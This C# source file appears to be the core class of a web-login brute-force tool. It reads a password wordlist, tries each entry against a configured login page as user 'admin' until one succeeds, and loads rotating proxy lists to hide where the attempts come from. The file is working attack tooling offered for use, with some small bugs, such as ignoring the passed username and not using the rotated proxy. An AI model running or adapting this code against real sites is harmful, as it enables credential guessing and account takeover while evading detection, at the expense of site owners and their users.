using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;
using System.ComponentModel;

namespace ConsoleLogin
{
    class BruteCore
    {
        event Status ChangeUI;


        LoginCore page;
        string defaultUserName = "admin";

        public BindingList<LoginCore> pages;

        WebProxy certainProxy;

        public bool goWithProxy { get; set; } = false;
        public bool autoChangeProxy { get; set; } = true;

        public BindingList<Tuple<string, int>> proxyList;
        bool keepSending;


        public BruteCore(Status updaterUI)
        {
            ChangeUI += updaterUI;

            keepSending = false;
            pages = new BindingList<LoginCore>();
            proxyList = new BindingList<Tuple<string, int>>();
        }
        public Task TestPageAsync(string username, string password)
        {
            return page.Login(username, password, certainProxy);
        }
        public async Task StartBruteAsync(int frequencySeconds, string userName, string passFile)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async Brute Started"));
            int sleepTime = frequencySeconds * 1000;
            keepSending = true;

            using (var classicStream = File.OpenRead(passFile))
            using (var streamReader = new StreamReader(classicStream))
            {
                while (keepSending == true && streamReader.Peek() >= 0)
                {
                    string _line = await streamReader.ReadLineAsync();
                    if(await LoginViaCore(defaultUserName,_line))
                    {
                        keepSending = false;
                    }
                    Thread.Sleep(sleepTime);
                }
            }
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async Brute Finished"));
        }
        private Task<bool> LoginViaCore(string userName, string password)
        {
            WebProxy myProxy = IdentifyProxySettings();
            return page.Login(userName, password, certainProxy);
        }
        private WebProxy IdentifyProxySettings()
        {
            if (autoChangeProxy)
            {
                var rand = new Random();
                int counter = rand.Next(0, proxyList.Count);
                WebProxy currentProxy = 
                    new WebProxy(proxyList[counter].Item1, proxyList[counter].Item2);
                currentProxy.BypassProxyOnLocal = true;
                return currentProxy;
            }
            else if (goWithProxy)
            {
                return certainProxy;
            }
            else
            {
                return null;
            }
        }

        public void AddPage(LoginCore siteInfo)
        {
            pages.Add(siteInfo);
            ChangeUI(this, new LoginEventArgs(EventType.Progress, 
                "Added new Page " + siteInfo.Name));
        }

        public async Task ReadPagesFromFile(string path)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, 
                "Started reading default pages from file" + path));
            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                string _filePath = await reader.ReadLineAsync();
                _filePath = string.Format("{0}\\Files\\{1}",path.Substring(0, path.LastIndexOf('\\')),_filePath);
                LoginCore newPage = new LoginCore(ChangeUI);
                await newPage.InitializeFromFile( _filePath);
                pages.Add(newPage);
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
            page = pages[0];
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Finished reading default pages from file" + path));
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                page.Name + " has been set as default brute page"));
        }
        public void StopBrute()
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async brute was terminated"));
            keepSending = false;
        }

        public void SetCurrentPage(LoginCore loginCore)
        {
            page = loginCore;
        }

        public async Task ReadProxyFromFileAsync(string path)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Started reading proxy from file" + path));

            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                string proxy = await reader.ReadLineAsync();
                int delimiter = proxy.IndexOf(' ');
                string ip = proxy.Substring(0, delimiter);
                int port = Convert.ToInt32(proxy.Substring(delimiter + 1));
                var couple = Tuple.Create(ip, port);
                proxyList.Add(couple);
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
        }

        public void SetCertainProxy(string proxy)
        {
            int delimiter = proxy.IndexOf(':');
            string ip = proxy.Substring(0, delimiter);
            int port = Convert.ToInt32(proxy.Substring(delimiter + 1));
            certainProxy = new WebProxy(ip, port);
            certainProxy.BypassProxyOnLocal = true;
        }
    }
}
